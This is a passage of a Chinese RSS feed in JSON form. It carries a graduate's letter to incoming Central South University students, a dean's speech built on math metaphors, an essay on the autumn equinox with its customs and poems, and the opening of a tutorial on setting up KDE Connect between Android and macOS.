data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"449\" data-watermark=\"original\" data-original-src=\"v2-1841f40944f493de47031e65e7862ec2\" data-watermark-src=\"v2-a8b77e08602a49342e9e4987b4f2d33b\" data-private-watermark-src=\"v2-e85d55d63de130a42b399d18126969a4\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-16630e02a93729f7c56fa07f393654e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"350\" data-watermark=\"original\" data-original-src=\"v2-16630e02a93729f7c56fa07f393654e3\" data-watermark-src=\"v2-b3301ed31af86c9f9bbb88da18034f09\" data-private-watermark-src=\"v2-a75fbf4dbddf495f14d9962bc4942027\"></p>\n<p><b>学弟学妹们：</b></p>\n<p>展信佳！</p>\n<p>我离开中南大学已期月有余，一直挂念。四年荏苒，让我对“中南”这个字眼越来越敏感——博友晒通知书，首先抓到的是中南的一抹蓝；长沙疫情告急，首先想到是在校的挚友；奥运健儿夺冠，首先看到的是中南校友的身姿。舞象之年，初至湖湘，四岁枯荣，再话道别，还是有些伴着思念的话想说一说。</p>\n<p><b>一、四年教育，是为了让你的人生选项像湘江支流一样多。</b></p>\n<p>读书的目的，是为了让自己有更多的选择权——这是我一直坚信的。我们正处在一个需要不断做选择、又很难做选择的年纪，因为底气不足所以举步维艰，而这四年教育就是我们日后最大的底气。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0463ef8c1416f189a60d154be09ffa0_720w.jpg?rss\" data-caption=\"（中南大学外国语学院2021年学位授予仪式上的李铭泽）\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"400\" data-watermark=\"original\" data-original-src=\"v2-c0463ef8c1416f189a60d154be09ffa0\" data-watermark-src=\"v2-732369fa1c269be96e490d0c06b870ff\" data-private-watermark-src=\"v2-62e5ed11db5925c1d282217272bf37c2\"></p>\n<p>大家通常将一个人的能力分为软硬两种，软实力是你周围人间接带给你的人脉、资源和朋友圈，说白了就是“你认识谁”；硬实力是你个人的能力，比如学识、学位、交流交往能力、问题解决能力等，这些构成了“你是谁”。</p>\n<p>硬实力是软实力的基础，是你做出选择的勇气，也是可以从教育中获得的最重要的东西。当你自身的“硬件”越好，以后的人生选择就越多，机会自然就越多。所以，在你还不知道该如何选择人生的时候，就埋头苦学，博览群书，当你完成从“我是谁”到“我认识谁”再到“都认识我”的转变时，人生自然会像湘江北去，坦途向前。</p>\n<p><b>二、选择中南，你的依靠会像麓山一样坚实绵延。</b></p>\n<p>我是一个停不住脚的人，四年里时常会外出参加一些活动，也就不免会遇到一些困难麻烦，但每次最能让我心安的，就是学校老师给我的支持——19年我前赴美国参加实习，也正是因为学校的资助才得以成行。我一直觉得中南是一所很宠学生的学校，在疫情隔离、学生资助、校园建设等方面从不亏待她的学子。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-71306672d346331a1a3ff6f0f526614f_720w.jpg?rss\" data-caption=\"（中南大学2021届毕业典礼与田红旗校长合影）\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-71306672d346331a1a3ff6f0f526614f\" data-watermark-src=\"v2-1daa563ef0300952a45b9e40d46d8019\" data-private-watermark-src=\"v2-63d6c88f2b56b9a495cf8c36b7dc5979\"></p>\n<p>如果你有困难，请大胆坚毅地告诉学校，定会获得意想不到的帮助。来到中南大学这样一所学校，意味着你们拥有了更丰富的学术资源、更优秀的老师、更广阔的的人脉资源、更好的就业机会和更高的发展平台。这里允许你尽情发挥自己的想象力和创造力，也请你们珍惜自己在学业科研、学生活动、创新创业等方面迸发出来的激情与创新，依托学院学校平台，勇于实践，综合成长。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a2c018cee8ea942aeb12e77edebabaec_720w.jpg?rss\" data-caption=\"（与时任中国驻联合国副代表吴海涛合影）\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"449\" data-watermark=\"original\" data-original-src=\"v2-a2c018cee8ea942aeb12e77edebabaec\" data-watermark-src=\"v2-42bdeb8128961e375fc41ff2e82b77a6\" data-private-watermark-src=\"v2-135a1138a127d4bdf34ee18e8abbefbd\"></p>\n<p><b>三、享受大学，你的生活要像左家垅的小吃一样丰富多彩。</b></p>\n<p>北京烤鸭、铜锅涮肉、雪莲餐厅、悦购广场、桥头排骨、茶颜悦色、COCO、正粤粥铺、户部巷烤面筋、一只酸奶牛......左家垅的小吃总是眼花缭乱，就像你大学四年的生活一样，酸甜苦辣咸，有人错过、有人离开、有人欣然前来、有人漫步心间。</p>\n<p>你们的大学要丰富多彩：学业、运动、社团、旅行、爱情、眼泪、美食，定义一个优秀大学生的标准是一群能哭能笑能压马路的朋友、出彩的学业、丰富多彩的校园生活、有规律的作息生活、值得骄傲的特长爱好、从心底满溢出来的阳光自信、阴霾困不住的精神气儿、能负担得起的社会责任和能扛得起的民族复兴大旗。</p>\n<p>建议你们每一年都做三件值得让自己骄傲的事情——可以是大事情，比如你拿到了国家奖学金、获得了国家比赛的第一名；也可以是一件非常小的事情，比如拍出了一张好看的相片、认识了一位挚友——只要你努力过、做了对的事，不论大小，幸福感自会沁入心脾的。</p>\n<p><b>四、初入校园，要找寻“欢迎广~临，茶颜~”一般的归属感。</b></p>\n<p>我不知道这声茶颜悦色的招牌金句能不能寄托所有中南人的长沙情结，但之于我，每次在机场车站听到这声音时，就明白我是回了长沙，这是我的归属感。</p>\n<p>在大学里，你们将独自面对整个生活，自己购物、自己洗衣服、自己看医生、自己规划生活、自己面对人生——这是你们青春岁月里迷茫感和孤独感的开始，也自会成为你们变得更加独立更加坚强的精神源泉。而在这四年孤寂岁月里，要记得寻找自己的归属感，你可以选择以寝室为归属、以某个社团为归属、以学生会为归属、以一段感情为归属等等。一群人，同一个目标、一起拼搏、共享欢乐、共度爱与愁，这就是归属感。独立生活的能力和归属感的支持，都将会是帮助你度过青春迷茫的锐利武器。还有，寻得挚友时，别忘了那一句“秋分时节，要多吃坚果，对身体好哦~”</p>\n<p>岳麓山的红叶又扮上新颜，湘江水还是澎湃着诗篇，麓山古寺的敲钟人依旧没换，麓山南路的故事也迎来了新的主演。此去经年，也不知何时再会中南，思无垠念无边，祝你们前程坦荡，敬颂台安。</p>\n<p>李铭泽</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-da-xue-sheng-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国大学生在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469460738/answer/2137162368?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">127 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/282403878?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想知道各类大学，大学生的作息时间表？</a><br><a href=\"http://www.zhihu.com/question/62809443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">普通大学大学生如何在大学期间提高自己？</a><br>\n","link":"http://www.zhihu.com/question/469460738/answer/2137162368?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"理科生觉得哪些知识不知道是文科生的遗憾？","date":"2021-09-26 12:26:06","description":"\n<p>中南大学2021年开学典礼上数学与统计学院院长的发言：</p>\n<p>青年人要立志。根据实数的阿基米德性，只要m不是0，无论m多么小，将很多同样的m加起来，我们可以得到任意大的数。从现在开始确立志向，将无数微小的努力累加，未来将会由我们创造。青年人要勤学。1.02的365次方是1377.4，0.98的365次方是0.0006。当坚持努力时，受益是巨大的；倘若懈怠，带来的后果便是不断退步。青年人要学会抗压。三角函数y=sin  x图像顶点两旁截然不同的走向告诉我们物极必反的道理，希望大家正视挫折、学会调节，拥有健康的身心。</p>\n<p>小中作为一个文科生，只能看懂一部分，剩下的不明觉厉……</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-da-xue-sheng-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国大学生在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/270455074/answer/2136803130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1073 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/276989917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">理科生觉得哪些知识不知道是理科生的遗憾？</a><br><a href=\"http://www.zhihu.com/question/266962550?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">作为一个文科生，想了解一些理科的知识，应从什么开始？</a><br>\n","link":"http://www.zhihu.com/question/270455074/answer/2136803130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"秋分 | 昼夜等长，寒暑均分","date":"2021-09-26 12:18:20","description":"\n<p></p>\n<p><b>故园应露白，凉夜又秋分。</b></p>\n<p><b>——（明）孙应《客中秋夜》</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>今日我们迎来24节气中的</p>\n<p>秋分</p>\n<p>秋分者</p>\n<p>阴阳相半</p>\n<p>昼夜均而寒暑平</p>\n<p>这是一年之中“平衡”的时候</p>\n<p>此时节</p>\n<p><b>秋云飘逸，秋水如镜</b></p>\n<p><b>处处迷人，令人陶醉</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd621508d9165396aa1af1056076d764_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"29\" data-rawheight=\"33\" class=\"content_image\" width=\"29\"></figure><p>秋分·三候</p>\n<p>一候 · 雷始收声</p>\n<p><b>雷声渐渐远去</b></p>\n<p><b>秋意阵阵袭来</b></p>\n<p>古人云雷因阳气盛而发声</p>\n<p>秋分后则阴气起而雷声停</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-0bf331dcd7e1e79381e3adc193b2dbaa_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"758\" data-rawheight=\"537\" class=\"origin_image zh-lightbox-thumb\" width=\"758\" data-original=\"https://pic3.zhimg.com/v2-0bf331dcd7e1e79381e3adc193b2dbaa_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>二候 · 蛰虫坯户</p>\n<p>寒凉悄然来袭</p>\n<p><b>虫为蛰居而筑穴</b></p>\n<p><b>抵寒过冬添“新瓦”</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2b912821e11b31d25cf51a408d3a5cf2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"718\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-2b912821e11b31d25cf51a408d3a5cf2_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>三候 · 水始涸</p>\n<p>清浅一抹河床</p>\n<p>潺潺一丝流水</p>\n<p>时光悠悠，岁月静好</p>\n<p>盛夏的树影似倒影在清澈的睡眠</p>\n<p>哪知原本的河床早已慢慢干涸</p>\n<p>只留下青葱的追忆</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0980e6a2e9455d7fcb8c589f4f80f619_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"672\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-0980e6a2e9455d7fcb8c589f4f80f619_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd621508d9165396aa1af1056076d764_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"29\" data-rawheight=\"33\" class=\"content_image\" width=\"29\"></figure><p>秋分·习俗</p>\n<p>“祭月节”</p>\n<p><b>春祭日，秋祭月</b></p>\n<p><b>秋分曾是传统的“祭月节”</b></p>\n<p>因秋分时月未满</p>\n<p>故后而中秋拜月</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-144cacddb55f4fe7e48bf26958b7638c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"563\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic1.zhimg.com/v2-144cacddb55f4fe7e48bf26958b7638c_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>“竖蛋”</p>\n<p>秋分到，竖蛋俏</p>\n<p>秋分立蛋是庆祝秋天的来临</p>\n<p>竖蛋活动寄寓了人们对</p>\n<p>生命、生育的敬畏和崇敬之情</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b639d71400667ff15d6c6136a603442b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"726\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-b639d71400667ff15d6c6136a603442b_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>送秋牛图</p>\n<p>取二开红黄纸</p>\n<p>印上农夫耕田图样</p>\n<p>名曰“秋牛图”</p>\n<p>送图者为民间善言唱者</p>\n<p>吉祥话言词随口而出</p>\n<p>句句有韵动听</p>\n<p>俗称“说秋”</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-71d839cccb0c80bf7189d9e963f11b35_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic2.zhimg.com/v2-71d839cccb0c80bf7189d9e963f11b35_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd621508d9165396aa1af1056076d764_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"29\" data-rawheight=\"33\" class=\"content_image\" width=\"29\"></figure><p>秋分·饮食</p>\n<p>蟹儿肥</p>\n<p><b>秋分时节</b></p>\n<p><b>肉肥膏腴</b></p>\n<p>螃蟹营养价值极高但性寒</p>\n<p>切勿大量食用</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-68836ff8ca9255ad38c3fc8b4f4798bc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"654\" class=\"origin_image zh-lightbox-thumb\" width=\"1024\" data-original=\"https://pic1.zhimg.com/v2-68836ff8ca9255ad38c3fc8b4f4798bc_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>石榴圆</p>\n<p>石榴圆润，籽粒饱满</p>\n<p>晶莹剔透的石榴籽</p>\n<p>轻咬入嘴</p>\n<p><b>酸甜滋味在玉浆中迸裂开来</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3fab431c2f5d924e7ba675598940c0bf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"699\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-3fab431c2f5d924e7ba675598940c0bf_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>菊花黄</p>\n<p>百花殆尽</p>\n<p>菊花却黄的清丽</p>\n<p>菊花味甘苦,性耐寒</p>\n<p>有散风清热、清肝明目、解毒消炎等作用。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d0fe79d925f1897495c23a5267270c5e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"467\" class=\"origin_image zh-lightbox-thumb\" width=\"700\" data-original=\"https://pic3.zhimg.com/v2-d0fe79d925f1897495c23a5267270c5e_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd621508d9165396aa1af1056076d764_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"29\" data-rawheight=\"33\" class=\"content_image\" width=\"29\"></figure><p>秋分·诗句</p>\n<p>南陵别儿童入京</p>\n<p>（唐）李白白酒新熟山中归，黄鸡啄黍秋正肥。呼童烹鸡酌白酒，儿女嬉笑牵人衣。高歌取醉欲自慰，起舞落日争光辉。游说万乘苦不早，著鞭跨马涉远道。会稽愚妇轻买臣，余亦辞家西入秦。仰天大笑出门去，我辈岂是蓬蒿人。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2550e42afac909e0779dd4ad5471c62f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"558\" data-rawheight=\"372\" class=\"origin_image zh-lightbox-thumb\" width=\"558\" data-original=\"https://pic4.zhimg.com/v2-2550e42afac909e0779dd4ad5471c62f_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>晚晴</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>（唐）杜甫</p>\n<p>返照斜初彻，浮云薄未归。</p>\n<p>江虹明远饮，峡雨落馀飞。</p>\n<p>凫雁终高去，熊罴觉自肥。</p>\n<p>秋分客尚在，竹露夕微微。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-58f939985eb1e9a8d8ef0e7e2a175e17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"49\" data-rawheight=\"56\" class=\"content_image\" width=\"49\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-fc399f3e73b1989aca6dd9cc4506ea3a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"413\" class=\"origin_image zh-lightbox-thumb\" width=\"737\" data-original=\"https://pic3.zhimg.com/v2-fc399f3e73b1989aca6dd9cc4506ea3a_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>中秋对月</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>（唐）李频</p>\n<p>秋分一夜停，阴魄最晶荧。</p>\n<p>好是生沧海，徐看历杳冥。</p>\n<p>层空疑洗色，万怪想潜形。</p>\n<p>他夕无相类，晨鸡不可听。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-58f939985eb1e9a8d8ef0e7e2a175e17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"49\" data-rawheight=\"56\" class=\"content_image\" width=\"49\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ebf829a00dec9c127ff5b8d3d5d09f8b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic4.zhimg.com/v2-ebf829a00dec9c127ff5b8d3d5d09f8b_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>秋天是收获的季节</p>\n<p>秋天是怡人的季节</p>\n<p>我们庆祝丰收</p>\n<p>也期盼团圆</p>\n<h2><b>是天上人间烟火</b></h2>\n<h2><b>绘就家的模样</b></h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<b><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-125a727344171f0d5357a111930ff246_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-125a727344171f0d5357a111930ff246_r.jpg\"></figure></b><p class=\"ztext-empty-paragraph\"><br></p>\n<p>（作者：张晋熙）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/413127008?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"通知推送、文件互传…… 免费好用的桌面 / 移动端协同工具：KDE Connect","date":"2021-09-26 09:49:24","description":"\n<p>单就从效率来看，我一直秉持着当有 PC 的时候，手机就需要从原本的「手持效率工具」向 PC 设备的协同工具进行转变 。毕竟有一个大屏高性能的设备在身边，本来就应该可以更高效地处理和管理手机通知、发送短信等，而小屏幕的手机本来就应该放在一旁才是。</p>\n<p>这也是我一直在找寻适合手机 / 电脑的协同工具的原因，事实上处于 Apple 生态圈的 iPhone 和 Mac 在跨设备协同上一直都被效率控津津乐道——在 Mac 上通过信息来回复 iPhone 上的短信，在 Mac 上接听来电、通过隔空投送来互传文件等等，这种便利度通过一个完整的生态圈实现，展现出 Apple 对于设备协同的实践。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c506k0lb34tdhopdm52g.png\"></figure><p>在 Windows 桌面端，微软在 Windows 10 中通过「你的手机」实现了 Android 和 iOS（iPhone）的协同——即便不属于同一生态圈也可以实现在 Windows 上拨打/接听电话，接发短信、管理手机通知等一系列的操作。</p>\n<p>但如果你恰巧用的是 Android 手机，然后桌面是 Mac，那么就必须使用第三方的 App 来实现，比如笔者我此前推荐的 <a href=\"https://sspai.com/post/62367\" target=\"_blank\">Join</a>，以及 Pushbullet、AirDroid 等这种跨平台协同类服务，当然在实际使用中他们都存在一些优点和缺点，这里我也大致对其进行了总结：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>服务</td>\n<td>Join</td>\n<td>Pushbullet</td>\n<td>AirDroid</td>\n</tr>\n<tr>\n<td>Mac 端形式</td>\n<td>客户端 / Chromium 内核浏览器扩展</td>\n<td>浏览器扩展</td>\n<td>客户端 / 浏览器访问</td>\n</tr>\n<tr>\n<td>通知同步和操作</td>\n<td>支持</td>\n<td>支持 / 付费订阅支持操作通知</td>\n<td>部分支持（部分通知可以操作）</td>\n</tr>\n<tr>\n<td>剪切板同步</td>\n<td>支持</td>\n<td>仅付费版</td>\n<td>否</td>\n</tr>\n<tr>\n<td>短消息收发</td>\n<td>支持</td>\n<td>支持（免费版受限）</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>通话功能</td>\n<td>否</td>\n<td>否</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>文件传输</td>\n<td>支持</td>\n<td>支持（免费版受限）</td>\n<td>支持（远程传输下有限制）</td>\n</tr>\n<tr>\n<td>收费方式</td>\n<td>客户端付费</td>\n<td>免费版/付费订阅</td>\n<td>免费版 / 订阅付费</td>\n</tr>\n</tbody></table></figure><p>那么有没有基本上支持以上功能，同时又完全免费的工具呢？有，比如今天介绍的这款开源应用：KDE Connect。</p>\n<h2>为什么选择 KDE Connect？</h2>\n<p>虽然我的主力桌面环境是在 Windows 10 ，但由于经常需要使用 macOS 来处理一些工作，因此我对于 Android 手机和 macOS 桌面之间的协同工具功能需求主要是：剪切板同步、可以收发短信息，以及在桌面端对手机的通知进行操作。</p>\n<p>虽然此前我介绍的 Join 基本可以实现这些功能，但由于几乎完全依赖 Google 的相关网络服务（比如通知的传输完全基于 FCM），并需要借助网页浏览器来使用，总体来说反而显得有些笨重。</p>\n<p>由于我的 Android 和 macOS 的协同操作场景主要在办公室和家中的局域网环境中，那么免费且仅只适用于局域网环境的 KDE Connect 就成为了我的首选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k0tb34tdhopdm530.png\"></figure><p>事实上 KDE Connect 最早主要是为了满足 Linux 桌面和 Android 手机协同需求而开发的，由于其开源的特性因此被移到了各种平台，在此之前在 macOS 上有一款基于 KDE Connect 的第三方桌面端：<a href=\"https://soduto.com/\" target=\"_blank\">Soduto</a>，但已经有三年多没有更新，在功能上和最新的 KDE Connect 相比后发现有比较大的差距。</p>\n<p>好在 KDE 官方现在已经推出了官方构建的 macOS 端应用，借此可以体验到最新最完整的 KDE Connect。</p>\n<h2>安装、配置 KDE Connect</h2>\n<p>或许是目前 macOS 的官方构建版本还并没有立即转正，因此在 KDE Connect 的官网中不能找到 macOS 的官方构建安装包，所以 macOS 客户端我们需要从 Binary Factory for KDE 中来查找，对于应用稳定性要求比较高的朋友，可以选择下载 <a href=\"https://binary-factory.kde.org/view/MacOS/job/kdeconnect-kde_Release_macos/\" target=\"_blank\">Release 版本</a>，而如果你想尝鲜的话，则可以试试 <a href=\"https://binary-factory.kde.org/view/MacOS/job/kdeconnect-kde_Nightly_macos/\" target=\"_blank\">Nightly 版本</a>。</p>\n<p>需要注意的是两个版本都没有加入 M1 的原生支持，使用 Apple M1 设备要想运行 KDE Connect 则必须通过 Rosetta 2 来运行应用，并且经过我的详细测试后，通过 Rosetta 2 转译运行的 KDE Connect 在功能上都一切正常。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k15b34tdhtodss6g.png\"></figure><p>而 Android 端则可以在 <a href=\"https://play.google.com/store/apps/details?id=org.kde.kdeconnect_tp\" target=\"_blank\">Google Play</a> 以及 <a href=\"https://f-droid.org/packages/org.kde.kdeconnect_tp/\" target=\"_blank\">F-Droid</a> 中下载安装，其实整个安装过程并不繁琐，但要想顺利地使用起来还需要进行配置工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k1db34tdhj3i1cjg.png\"></figure><p>首先是打开桌面端的 KDE Connect，默认情况下 KDE Connect 不会驻留在 Dock 栏中，而是直接最小化到系统菜单栏中。点击图标然后选择「Configure」打开设置项，你会发现桌面端能设置的其实只有「配对」和「改名」——修改当前桌面设备的名称，以及和手机端进行配对。事实上 KDE Connect 主要配置项都在 Android 端上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k1db34tdhtodss70.png\"></figure><p>接下来我们需要对 Android 端进行一系列的配置，首先我们需要和当前的局域网下的 macOS 设备进行配对，点击侧栏中的「配对新设备」，然后在局域网内进行设备的搜索（如果找不到可以点击右上角来通过 IP 添加设备），选择想要配对的设备后客户端会发起配对请求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k1lb34tdhtodss7g.png\"></figure><p>这时候回到 macOS 上的 KDE Connect ，在对应的设备的右侧选择「Accept」来完成配对，配对之后 Android 端的 KDE Connect 会列出对应桌面端设备和相对应的功能，你可以点击右上角的「发送 Ping」来测试是否已经成功配对，如果在 macOS 的桌面收到发自 Android 的一个通知，这说明我们已经成功完成了 KDE Connect 最基本的设置了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k1tb34tdhopdm53g.png\"></figure><h2>使用场景</h2>\n<p>和很多跨平台的协同工具有所不同的是，KDE Connect 将各个实用的功能封装成一个个功能插件，用户完全可以根据自己的需求选择是否启用——只有两个端对应的插件功能都选择激活了才能正常使用。</p>\n<h3>在桌面端操作同步的通知</h3>\n<p>选择 KDE Connect 很大一部分的原因是我自己需要在macOS 上操作从手机同步过来的通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k25b34tdhj3i1ck0.png\"></figure><p>在 Android 端，这项功能叫做「通知同步」，和微软的「你的手机」类似，我们同样可以在「插件设置 - 通知同步」中选择哪些应用的通知会被同步到桌面。至于 macOS 端，你只需要在插件列表中，确保这个名为「Rreceive notification」的选项勾选上即可。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 